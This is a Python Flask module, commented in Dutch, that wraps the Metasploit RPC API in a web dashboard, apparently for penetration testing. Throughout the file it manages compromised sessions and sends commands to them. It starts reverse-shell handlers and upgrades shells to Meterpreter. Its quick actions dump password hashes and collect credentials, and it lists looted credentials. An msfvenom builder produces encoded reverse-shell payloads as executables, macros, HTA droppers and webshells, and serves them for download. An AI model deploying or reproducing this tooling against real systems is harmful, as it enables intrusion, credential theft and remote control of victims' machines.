"""Metasploit RPC integratie via pymetasploit3."""

import datetime
import os
import re
import subprocess
import threading
import time
import uuid
from collections import deque

from flask import Blueprint, abort, jsonify, render_template, request, send_file

from app import db
from meuk.flask.models import db_notes
from meuk.flask.security import is_local_request, require_dashboard_access

msf_bp = Blueprint('msf_bp', __name__, template_folder='html')

_MSF_HOST = os.environ.get('MSF_RPC_HOST', '127.0.0.1')
_MSF_PORT = int(os.environ.get('MSF_RPC_PORT', 55553))
_MSF_USER = os.environ.get('MSF_RPC_USER', 'msf')
_MSF_PASS = os.environ.get('MSF_RPC_PASS', 'msf')
_MSF_SSL  = os.environ.get('MSF_RPC_SSL', 'false').lower() in ('1', 'true', 'yes')

# ── Allowlists ────────────────────────────────────────────────────────────────

_QUICK_ACTIONS_METERPRETER = {
    'sysinfo':   'sysinfo',
    'getuid':    'getuid',
    'getsystem': 'getsystem',
    'hashdump':  'hashdump',
    'arp':       'arp',
    'ifconfig':  'ifconfig',
    'ps':        'ps',
    'privesc':   'run post/multi/recon/local_exploit_suggester',
    'network':   'run post/multi/gather/network_interface_list',
    'creds':     'run post/windows/gather/credentials/credential_collector',
}

_QUICK_ACTIONS_SHELL = {
    'id':       'id',
    'whoami':   'whoami',
    'uname':    'uname -a',
    'ifconfig': 'ifconfig || ip a',
    'ps':       'ps aux',
    'sudoers':  'sudo -l',
    'suid':     'find / -perm -4000 -type f 2>/dev/null',
}

_ALLOWED_PAYLOADS = {
    # Windows x64
    'windows/x64/meterpreter/reverse_tcp',
    'windows/x64/meterpreter/reverse_https',
    'windows/x64/meterpreter/reverse_http',
    'windows/x64/meterpreter_reverse_tcp',
    'windows/x64/shell/reverse_tcp',
    'windows/x64/shell_reverse_tcp',
    'windows/x64/powershell_reverse_tcp',
    # Windows x86
    'windows/meterpreter/reverse_tcp',
    'windows/meterpreter/reverse_https',
    'windows/meterpreter/reverse_http',
    'windows/shell_reverse_tcp',
    # Linux
    'linux/x64/meterpreter/reverse_tcp',
    'linux/x64/meterpreter/reverse_http',
    'linux/x64/meterpreter_reverse_tcp',
    'linux/x64/shell/reverse_tcp',
    'linux/x64/shell_reverse_tcp',
    'linux/x86/meterpreter/reverse_tcp',
    'linux/x86/shell/reverse_tcp',
    'linux/x86/shell_reverse_tcp',
    # macOS
    'osx/x64/meterpreter/reverse_tcp',
    'osx/x64/meterpreter_reverse_tcp',
    'osx/x64/shell_reverse_tcp',
    # Android
    'android/meterpreter/reverse_tcp',
    'android/meterpreter/reverse_https',
    'android/shell/reverse_tcp',
    # Multi / script
    'python/meterpreter/reverse_tcp',
    'python/meterpreter/reverse_https',
    'java/meterpreter/reverse_tcp',
    'java/shell/reverse_tcp',
    'php/meterpreter/reverse_tcp',
    'php/meterpreter_reverse_tcp',
}

# ── Gecachede verbinding (hergebruik TCP/TLS per thread) ──────────────────────

_client_lock = threading.Lock()
_cached_client = None


def _create_client():
    try:
        from pymetasploit3.msfrpc import MsfRpcClient
        return MsfRpcClient(
            _MSF_PASS,
            server=_MSF_HOST,
            port=_MSF_PORT,
            username=_MSF_USER,
            ssl=_MSF_SSL,
        )
    except ImportError:
        raise RuntimeError("pymetasploit3 niet geinstalleerd — pip install pymetasploit3")
    except Exception as exc:
        raise RuntimeError(f"Kan niet verbinden met msfrpcd op {_MSF_HOST}:{_MSF_PORT} — {exc}")


def _get_client():
    """Geef gecachede client; maak opnieuw verbinding bij verbroken sessie."""
    global _cached_client
    with _client_lock:
        if _cached_client is not None:
            try:
                _cached_client.core.version()
                return _cached_client
            except Exception:
                _cached_client = None
        _cached_client = _create_client()
        return _cached_client


# ── Pagina ────────────────────────────────────────────────────────────────────

@msf_bp.route('/dashboard/msf')
def msf_overview():
    require_dashboard_access()
    return render_template('msf_sessions.html')


# ── Status ────────────────────────────────────────────────────────────────────

@msf_bp.route('/api/msf/status')
def api_msf_status():
    require_dashboard_access()
    try:
        client = _get_client()
        v = client.core.version()
        return jsonify({'connected': True,
                        'version': v.get('version', ''),
                        'ruby':    v.get('ruby', ''),
                        'api':     v.get('api', '')})
    except RuntimeError as exc:
        return jsonify({'connected': False, 'error': str(exc)})


# ── MSF Console (non-blocking polling, geen sleep in request handler) ─────────

@msf_bp.route('/api/msf/console', methods=['POST'])
def api_msf_console_create():
    """Maak een nieuwe interactieve MSF console aan."""
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    try:
        client = _get_client()
        console = client.consoles.console()
        return jsonify({'cid': console.cid})
    except RuntimeError as exc:
        return jsonify({'error': str(exc)}), 503


@msf_bp.route('/api/msf/console/<cid>/read')
def api_msf_console_read(cid):
    """Lees gebufferde output — keert direct terug (non-blocking)."""
    require_dashboard_access()
    try:
        client = _get_client()
        result = client.consoles.console(cid).read()
        return jsonify({
            'data':   result.get('data', ''),
            'prompt': result.get('prompt', ''),
            'busy':   bool(result.get('busy', False)),
        })
    except RuntimeError as exc:
        return jsonify({'error': str(exc)}), 503
    except Exception as exc:
        return jsonify({'error': str(exc)}), 500


@msf_bp.route('/api/msf/console/<cid>/write', methods=['POST'])
def api_msf_console_write(cid):
    """Schrijf commando naar console (keert direct terug)."""
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    data = request.get_json(force=True) or {}
    cmd = data.get('cmd', '').strip()
    if not cmd:
        return jsonify({'error': 'geen commando'}), 400
    if len(cmd) > 4096:
        return jsonify({'error': 'commando te lang'}), 400
    try:
        client = _get_client()
        client.consoles.console(cid).write(cmd + '\n')
        return jsonify({'ok': True})
    except RuntimeError as exc:
        return jsonify({'error': str(exc)}), 503
    except Exception as exc:
        return jsonify({'error': str(exc)}), 500


@msf_bp.route('/api/msf/console/<cid>/destroy', methods=['POST'])
def api_msf_console_destroy(cid):
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    try:
        _get_client().consoles.console(cid).destroy()
    except Exception:
        pass
    return jsonify({'ok': True})


# ── Sessies ───────────────────────────────────────────────────────────────────

@msf_bp.route('/api/msf/sessions')
def api_msf_sessions():
    require_dashboard_access()
    try:
        client = _get_client()
        sessions = []
        for sid, info in client.sessions.list.items():
            sessions.append({
                'id':           sid,
                'type':         info.get('type', ''),
                'tunnel_local': info.get('tunnel_local', ''),
                'tunnel_peer':  info.get('tunnel_peer', ''),
                'via_exploit':  info.get('via_exploit', ''),
                'via_payload':  info.get('via_payload', ''),
                'desc':         info.get('desc', ''),
                'info':         info.get('info', ''),
                'workspace':    info.get('workspace', ''),
                'session_host': info.get('session_host', ''),
                'session_port': info.get('session_port', ''),
                'username':     info.get('username', ''),
                'uuid':         info.get('uuid', ''),
                'arch':         info.get('arch', ''),
                'platform':     info.get('platform', ''),
                'routes':       info.get('routes', ''),
            })
        return jsonify({'sessions': sessions, 'count': len(sessions)})
    except RuntimeError as exc:
        return jsonify({'sessions': [], 'count': 0, 'error': str(exc)})


@msf_bp.route('/api/msf/sessions/<sid>/write', methods=['POST'])
def api_msf_session_write(sid):
    """Schrijf naar sessie — keert direct terug, poll /read voor output."""
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    data = request.get_json(force=True) or {}
    cmd = data.get('cmd', '').strip()
    if not cmd:
        return jsonify({'error': 'geen commando'}), 400
    if len(cmd) > 2048:
        return jsonify({'error': 'commando te lang'}), 400
    try:
        _get_client().sessions.session(sid).write(cmd + '\n')
        return jsonify({'ok': True})
    except RuntimeError as exc:
        return jsonify({'error': str(exc)}), 503
    except Exception as exc:
        return jsonify({'error': str(exc)}), 500


@msf_bp.route('/api/msf/sessions/<sid>/read')
def api_msf_session_read(sid):
    """Lees gebufferde sessie-output (non-blocking polling)."""
    require_dashboard_access()
    try:
        output = _get_client().sessions.session(sid).read()
        return jsonify({'output': output or ''})
    except RuntimeError as exc:
        return jsonify({'error': str(exc)}), 503
    except Exception as exc:
        return jsonify({'error': str(exc)}), 500


_SESSION_TASKS      = {}
_SESSION_TASKS_LOCK = threading.Lock()


def _session_task_run(task_id, sid, cmd, wait):
    """Achtergrondthread: schrijf commando, wacht, lees output — geen sleep in request handler."""
    now = time.time()
    with _SESSION_TASKS_LOCK:
        # Ruim verlopen taken op (ouder dan 2 uur)
        stale = [k for k, v in _SESSION_TASKS.items() if v.get('created_at', 0) < now - 7200]
        for k in stale:
            del _SESSION_TASKS[k]
        _SESSION_TASKS[task_id] = {'status': 'running', 'cmd': cmd, 'output': '', 'created_at': now}
    try:
        client = _get_client()
        sess   = client.sessions.session(sid)
        sess.write(cmd + '\n')
        time.sleep(wait)
        output = sess.read() or ''
        with _SESSION_TASKS_LOCK:
            _SESSION_TASKS[task_id].update({'status': 'done', 'output': output})
    except Exception as exc:
        with _SESSION_TASKS_LOCK:
            _SESSION_TASKS[task_id].update({'status': 'error', 'output': str(exc)})


@msf_bp.route('/api/msf/sessions/task/<task_id>')
def api_msf_session_task_poll(task_id):
    """Poll task status voor /run en /quickrun (non-blocking)."""
    require_dashboard_access()
    with _SESSION_TASKS_LOCK:
        task = _SESSION_TASKS.get(task_id)
    if not task:
        return jsonify({'error': 'taak niet gevonden'}), 404
    return jsonify(task)


@msf_bp.route('/api/msf/sessions/<sid>/run', methods=['POST'])
def api_msf_session_run(sid):
    """Start commando in sessie — geeft direct task_id terug, poll /task/<id> voor output."""
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    data = request.get_json(force=True) or {}
    cmd = data.get('cmd', '').strip()
    if not cmd:
        return jsonify({'error': 'geen commando opgegeven'}), 400
    if len(cmd) > 2048:
        return jsonify({'error': 'commando te lang'}), 400
    wait = min(float(data.get('wait', 2.0)), 30.0)
    task_id = str(uuid.uuid4())
    threading.Thread(target=_session_task_run, args=(task_id, sid, cmd, wait), daemon=True).start()
    return jsonify({'ok': True, 'task_id': task_id})


@msf_bp.route('/api/msf/sessions/<sid>/quickrun', methods=['POST'])
def api_msf_session_quickrun(sid):
    """Start toegestaan quick-action commando — geeft direct task_id terug."""
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    data = request.get_json(force=True) or {}
    action = data.get('action', '').strip()
    cmd = _QUICK_ACTIONS_METERPRETER.get(action) or _QUICK_ACTIONS_SHELL.get(action)
    if not cmd:
        return jsonify({'error': f'Onbekende actie: {action}'}), 400
    wait = 5.0 if cmd.startswith('run post/') else 2.0
    task_id = str(uuid.uuid4())
    threading.Thread(target=_session_task_run, args=(task_id, sid, cmd, wait), daemon=True).start()
    return jsonify({'ok': True, 'task_id': task_id, 'cmd': cmd, 'action': action})


@msf_bp.route('/api/msf/sessions/<sid>/upgrade', methods=['POST'])
def api_msf_session_upgrade(sid):
    """Upgrade shell sessie naar Meterpreter via post/multi/manage/shell_to_meterpreter."""
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    data = request.get_json(force=True) or {}
    lhost = data.get('lhost', '').strip()
    lport = data.get('lport', '4433')
    if not lhost:
        return jsonify({'error': 'LHOST is verplicht'}), 400
    try:
        lport_int = int(str(lport))
        if not (1 <= lport_int <= 65535):
            raise ValueError
    except ValueError:
        return jsonify({'error': 'Ongeldig poortnummer'}), 400
    try:
        client = _get_client()
        post = client.modules.use('post', 'multi/manage/shell_to_meterpreter')
        post['SESSION'] = sid
        post['LHOST']   = lhost
        post['LPORT']   = lport_int
        result = post.execute()
        return jsonify({'ok': True, 'job_id': result.get('job_id', result.get('id', '?'))})
    except RuntimeError as exc:
        return jsonify({'error': str(exc)}), 503
    except Exception as exc:
        return jsonify({'error': f'Upgrade fout: {exc}'}), 500


@msf_bp.route('/api/msf/sessions/<sid>/save-note', methods=['POST'])
def api_msf_save_note(sid):
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    data = request.get_json(force=True) or {}
    titel  = data.get('titel', '').strip()[:255]
    inhoud = data.get('inhoud', '').strip()
    if not titel or not inhoud:
        return jsonify({'error': 'titel en inhoud zijn verplicht'}), 400
    ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M')
    note = db_notes(naam=titel,
                    uitwerken=f"**Sessie #{sid} — {ts}**\n\n```\n{inhoud}\n```")
    db.session.add(note)
    db.session.commit()
    return jsonify({'ok': True, 'note_id': note.id})


@msf_bp.route('/api/msf/sessions/<sid>/kill', methods=['POST'])
def api_msf_session_kill(sid):
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    try:
        _get_client().sessions.session(sid).stop()
        return jsonify({'ok': True})
    except RuntimeError as exc:
        return jsonify({'error': str(exc)}), 503
    except Exception as exc:
        return jsonify({'error': str(exc)}), 500


# ── Jobs ──────────────────────────────────────────────────────────────────────

@msf_bp.route('/api/msf/jobs')
def api_msf_jobs():
    require_dashboard_access()
    try:
        client = _get_client()
        jobs = [{'id': jid,
                 'name': info if isinstance(info, str) else info.get('name', str(info))}
                for jid, info in client.jobs.list.items()]
        return jsonify({'jobs': jobs, 'count': len(jobs)})
    except RuntimeError as exc:
        return jsonify({'jobs': [], 'count': 0, 'error': str(exc)})


@msf_bp.route('/api/msf/jobs/<jid>/kill', methods=['POST'])
def api_msf_job_kill(jid):
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    try:
        _get_client().jobs.stop(jid)
        return jsonify({'ok': True})
    except RuntimeError as exc:
        return jsonify({'error': str(exc)}), 503
    except Exception as exc:
        return jsonify({'error': str(exc)}), 500


# ── Handlers ──────────────────────────────────────────────────────────────────

@msf_bp.route('/api/msf/handlers')
def api_msf_handlers():
    require_dashboard_access()
    try:
        client = _get_client()
        handlers = []
        for jid, info in client.jobs.list.items():
            name = info if isinstance(info, str) else info.get('name', '')
            if 'handler' in name.lower():
                handlers.append({'id': jid, 'name': name})
        return jsonify({'handlers': handlers, 'count': len(handlers)})
    except RuntimeError as exc:
        return jsonify({'handlers': [], 'count': 0, 'error': str(exc)})


@msf_bp.route('/api/msf/handlers', methods=['POST'])
def api_msf_handler_start():
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    data = request.get_json(force=True) or {}
    payload = data.get('payload', '').strip()
    lhost   = data.get('lhost', '').strip()
    lport   = data.get('lport', '').strip()
    if payload not in _ALLOWED_PAYLOADS:
        return jsonify({'error': f'Payload niet toegestaan: {payload}'}), 400
    if not lhost or not lport:
        return jsonify({'error': 'LHOST en LPORT zijn verplicht'}), 400
    try:
        lport_int = int(lport)
        if not (1 <= lport_int <= 65535):
            raise ValueError
    except ValueError:
        return jsonify({'error': 'Ongeldig poortnummer'}), 400
    try:
        client  = _get_client()
        exploit = client.modules.use('exploit', 'multi/handler')
        exploit['PAYLOAD']       = payload
        exploit['LHOST']         = lhost
        exploit['LPORT']         = lport_int
        exploit['ExitOnSession'] = False
        result  = exploit.execute(payload=payload)
        job_id  = result.get('job_id', result.get('id', '?'))
        return jsonify({'ok': True, 'job_id': job_id,
                        'payload': payload, 'lhost': lhost, 'lport': lport_int})
    except RuntimeError as exc:
        return jsonify({'error': str(exc)}), 503
    except Exception as exc:
        return jsonify({'error': f'Handler fout: {exc}'}), 500


# ── Loot & Credentials (vereist MSF database verbinding) ─────────────────────

@msf_bp.route('/api/msf/loot')
def api_msf_loot():
    require_dashboard_access()
    try:
        client = _get_client()
        try:
            result = client.call('db.loots', [{}])
            loots  = result.get('loots', [])
        except Exception:
            loots = []
        return jsonify({'loots': loots, 'count': len(loots)})
    except RuntimeError as exc:
        return jsonify({'loots': [], 'count': 0, 'error': str(exc)})


@msf_bp.route('/api/msf/creds')
def api_msf_creds():
    require_dashboard_access()
    try:
        client = _get_client()
        try:
            result = client.call('db.creds', [{}])
            creds  = result.get('creds', [])
        except Exception:
            creds = []
        return jsonify({'creds': creds, 'count': len(creds)})
    except RuntimeError as exc:
        return jsonify({'creds': [], 'count': 0, 'error': str(exc)})


# ── Msfvenom payload generator ────────────────────────────────────────────────

_MSFVENOM_PAYLOADS = {
    'Windows': [
        'windows/x64/meterpreter/reverse_tcp',
        'windows/x64/meterpreter/reverse_https',
        'windows/x64/meterpreter/reverse_http',
        'windows/x64/meterpreter_reverse_tcp',
        'windows/x64/shell/reverse_tcp',
        'windows/x64/shell_reverse_tcp',
        'windows/x64/powershell_reverse_tcp',
        'windows/meterpreter/reverse_tcp',
        'windows/meterpreter/reverse_https',
        'windows/meterpreter/reverse_http',
        'windows/shell_reverse_tcp',
        'windows/x64/exec',
        'windows/adduser',
    ],
    'Linux': [
        'linux/x64/meterpreter/reverse_tcp',
        'linux/x64/meterpreter/reverse_http',
        'linux/x64/meterpreter_reverse_tcp',
        'linux/x64/shell/reverse_tcp',
        'linux/x64/shell_reverse_tcp',
        'linux/x86/meterpreter/reverse_tcp',
        'linux/x86/shell/reverse_tcp',
        'linux/x86/shell_reverse_tcp',
    ],
    'macOS': [
        'osx/x64/meterpreter/reverse_tcp',
        'osx/x64/meterpreter_reverse_tcp',
        'osx/x64/shell_reverse_tcp',
    ],
    'Android': [
        'android/meterpreter/reverse_tcp',
        'android/meterpreter/reverse_https',
        'android/shell/reverse_tcp',
    ],
    'Multi / script': [
        'java/meterpreter/reverse_tcp',
        'java/shell/reverse_tcp',
        'python/meterpreter/reverse_tcp',
        'python/meterpreter/reverse_https',
        'python/shell_reverse_tcp',
        'php/meterpreter/reverse_tcp',
        'php/meterpreter_reverse_tcp',
        'ruby/shell_reverse_tcp',
        'cmd/unix/reverse_bash',
        'cmd/unix/reverse_python',
        'cmd/unix/reverse_netcat',
    ],
}

_MSFVENOM_FORMATS = {
    'exe':     'Windows EXE',
    'dll':     'Windows DLL',
    'elf':     'Linux ELF',
    'macho':   'macOS Mach-O',
    'ps1':     'PowerShell (.ps1)',
    'asp':     'ASP webshell',
    'aspx':    'ASPX webshell',
    'jsp':     'JSP webshell',
    'war':     'Java WAR',
    'hta-psh': 'HTA (PowerShell dropper)',
    'vba':     'VBA macro',
    'raw':     'Raw shellcode (.bin)',
    'c':       'C shellcode array',
    'python':  'Python script',
    'bash':    'Bash script',
    'pl':      'Perl script',
}

_FORMAT_TO_EXT = {
    'exe': '.exe', 'dll': '.dll', 'elf': '.elf', 'macho': '.macho',
    'ps1': '.ps1', 'asp': '.asp', 'aspx': '.aspx', 'jsp': '.jsp',
    'war': '.war', 'hta-psh': '.hta', 'vba': '.vba', 'raw': '.bin',
    'c': '.c', 'python': '.py', 'bash': '.sh', 'pl': '.pl',
}

_ALLOWED_VENOM_PAYLOADS = {p for ps in _MSFVENOM_PAYLOADS.values() for p in ps}
_ALLOWED_VENOM_FORMATS  = set(_MSFVENOM_FORMATS.keys())
_ALLOWED_VENOM_ENCODERS = {
    '', 'x86/shikata_ga_nai', 'x64/xor_dynamic', 'x64/xor',
    'x86/xor', 'x86/alpha_mixed', 'x64/zutto_dekiru',
}

_VENOM_RUNS      = {}
_VENOM_RUNS_LOCK = threading.Lock()
_MAX_VENOM_TIME  = 300


@msf_bp.route('/dashboard/msf/venom')
def msf_venom_page():
    require_dashboard_access()
    return render_template('msfvenom.html',
                           payloads=_MSFVENOM_PAYLOADS,
                           formats=_MSFVENOM_FORMATS,
                           encoders=sorted(_ALLOWED_VENOM_ENCODERS - {''}))


@msf_bp.route('/api/msf/venom/generate', methods=['POST'])
def api_msf_venom_generate():
    require_dashboard_access()
    if not is_local_request():
        abort(403)

    data       = request.get_json(force=True) or {}
    payload    = data.get('payload', '').strip()
    lhost      = data.get('lhost', '').strip()
    lport      = str(data.get('lport', '443')).strip()
    fmt        = data.get('format', 'exe').strip()
    filename   = data.get('filename', 'shell').strip()
    encoder    = data.get('encoder', '').strip()
    iterations = data.get('iterations', 0)
    extra_opts = data.get('extra_opts', '').strip()

    if not payload or payload not in _ALLOWED_VENOM_PAYLOADS:
        return jsonify({'ok': False, 'error': 'Ongeldige payload'}), 400
    if not lhost or not re.match(r'^[\w.\-]+$', lhost):
        return jsonify({'ok': False, 'error': 'Ongeldige LHOST'}), 400
    try:
        port_int = int(lport)
        if not (1 <= port_int <= 65535):
            raise ValueError
    except ValueError:
        return jsonify({'ok': False, 'error': 'Ongeldig poortnummer'}), 400
    if fmt not in _ALLOWED_VENOM_FORMATS:
        return jsonify({'ok': False, 'error': 'Ongeldig formaat'}), 400
    if encoder not in _ALLOWED_VENOM_ENCODERS:
        return jsonify({'ok': False, 'error': 'Ongeldige encoder'}), 400

    filename = re.sub(r'[^a-zA-Z0-9_\-]', '', filename) or 'shell'
    ext = _FORMAT_TO_EXT.get(fmt, '.bin')
    output_path = f'http/payloads/{filename}{ext}'

    cmd = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={port_int}']
    if encoder:
        cmd.extend(['-e', encoder])
        try:
            itr = int(iterations)
            if itr > 0:
                cmd.extend(['-i', str(itr)])
        except (ValueError, TypeError):
            pass
    # Alleen KEY=value extra opties toestaan
    if extra_opts:
        for opt in extra_opts.split():
            if re.match(r'^[A-Za-z_][A-Za-z0-9_]*=[^\s;|&`$]{1,128}$', opt):
                cmd.append(opt)
    cmd.extend(['-f', fmt, '-o', output_path])

    run_id = str(uuid.uuid4())

    def _run():
        output = deque(maxlen=500)
        _now = int(time.time())
        with _VENOM_RUNS_LOCK:
            # Verwijder runs ouder dan 2 uur
            _cutoff = _now - 7200
            stale = [k for k, v in _VENOM_RUNS.items() if v.get('started', 0) < _cutoff]
            for k in stale:
                del _VENOM_RUNS[k]
            _VENOM_RUNS[run_id] = {
                'status':      'running',
                'output':      output,
                'output_path': output_path,
                'cmd':         ' '.join(cmd),
                'payload':     payload,
                'lhost':       lhost,
                'lport':       port_int,
                'started':     int(time.time()),
            }
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1, shell=False,
            )
            deadline = time.time() + _MAX_VENOM_TIME
            while True:
                line = proc.stdout.readline()
                if line:
                    output.append(line.rstrip('\n'))
                if proc.poll() is not None:
                    break
                if time.time() > deadline:
                    proc.kill()
                    output.append('[!] Timeout na 300s')
                    break
            for line in proc.stdout:
                output.append(line.rstrip('\n'))
            rc = proc.returncode if proc.returncode is not None else -1
            with _VENOM_RUNS_LOCK:
                _VENOM_RUNS[run_id]['status'] = 'success' if rc == 0 else 'failed'
                _VENOM_RUNS[run_id]['rc'] = rc
        except Exception as exc:
            with _VENOM_RUNS_LOCK:
                _VENOM_RUNS[run_id]['status'] = 'failed'
                _VENOM_RUNS[run_id]['output'].append(f'Opstartfout: {exc}')

    threading.Thread(target=_run, daemon=True).start()
    return jsonify({'ok': True, 'run_id': run_id, 'output_path': output_path})


@msf_bp.route('/api/msf/venom/status/<run_id>')
def api_msf_venom_status(run_id):
    require_dashboard_access()
    with _VENOM_RUNS_LOCK:
        run = _VENOM_RUNS.get(run_id)
    if not run:
        return jsonify({'ok': False, 'error': 'Niet gevonden'}), 404
    return jsonify({
        'ok':          True,
        'status':      run['status'],
        'output':      list(run['output']),
        'output_path': run.get('output_path', ''),
        'cmd':         run.get('cmd', ''),
        'payload':     run.get('payload', ''),
        'lhost':       run.get('lhost', ''),
        'lport':       run.get('lport', ''),
    })


@msf_bp.route('/api/msf/venom/download/<run_id>')
def api_msf_venom_download(run_id):
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    with _VENOM_RUNS_LOCK:
        run = _VENOM_RUNS.get(run_id)
    if not run or run['status'] != 'success':
        abort(404)
    path = run.get('output_path', '')
    if not path or not os.path.isfile(path):
        abort(404)
    return send_file(os.path.abspath(path), as_attachment=True)
